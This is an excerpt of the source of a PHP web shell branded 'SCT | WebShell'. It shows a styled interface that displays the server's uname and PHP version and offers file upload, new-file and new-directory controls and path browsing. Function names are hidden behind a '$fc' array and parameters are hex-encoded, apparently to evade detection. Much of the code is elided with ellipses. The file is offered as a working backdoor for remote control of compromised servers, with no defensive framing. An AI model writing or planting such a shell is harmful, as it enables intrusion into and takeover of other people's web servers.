...
<head>
	...
	<link rel="shorcut icon" type="image" href="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fae01.alicdn.com%2Fkf%2FHTB1lbZkl2uSBuNkHFqDq6xfhVXaS%2F2019-Cool-Skull-Middle-Finger-3D-USB-LED-Lamp-Pop-Rock-Music-Boy-Room-Decor-7.jpg&f=1&nofb=1&ipt=23d9f7a4584ea47a61af92bfbb7e5f0261545fd05dde40e33638317c584af3ea&ipo=images">
	<title><?= self ?></title>
	<style>
		.bg-l{
		...
		body {
			...
			background-image: url("https://blogger.googleusercontent.com/img/a/AVvXsEgA6Ls_Y2qmw6ghImJkudyLmu6aZD6eKlA1SzmYhVxyeDOX9x3DICmhf4wVdPt7S3HluFhbxF0W8wTMNk8pOG1y7h_WiJ-S9rmuhtCvPEevQMfDIcsfEATus4q--MwtJpN-vuHWaX76HAKw2giJBtNM3-CWmKcypQ12LSsvyg2XwAVsXmUR0k6-CA_a=s640");
		...
		.ho {
			color: whitesmoke;
			text-shadow: 2px 0 1px red, 1px 2px 0 red;
			font-weight: 900;
...
<body>
	<div class="table-responsive text-light">
		<div class="d-flex justify-content-between p-1">
			<div><h3 class="mt-2">
				<a href="?" class="fuck">SCT | WebShell</a>
			</h3>
			</div>
			<div><span>PHP Version : <?= $fc[1]() ?></span> <br>
				<a href="?p=<?= hex($p)."&a=".hex("newFile") ?>">+File</a>
				<a href="?p=<?= hex($p)."&a=".hex("newDir") ?>">+Directory</a>
			</div>
		</div>
		<div class=" table-responsive ho">
			<li>Uname : <?= $fc[0]() ?></li>
		</div>
		<form method="post" enctype="multipart/form-data">
			<div class="input-group mb-1 px-1 mt-1">
				<div class="custom-file">
					...
					<label class="custom-file-label rounded-0 ju text-light">Choose file</label>
				</div>
			</div>
		</form>
<?php
...
?>
</div><div class="bg-transparent table-responsive mt-2"><div class="ml-2" style="font-size:18px;"><span>Path: </span>
<?php
$ps = $fc[4]("/(\\\|\/)/", $p);
foreach ($ps as $k => $v) {
	if ($k == 0 && $v == "") {
...
?>
</div></div><article class="bg-transparent border table-responsive mt-2 mek mek-hover">
<?php if (!isset($_GET["a"])): ?>
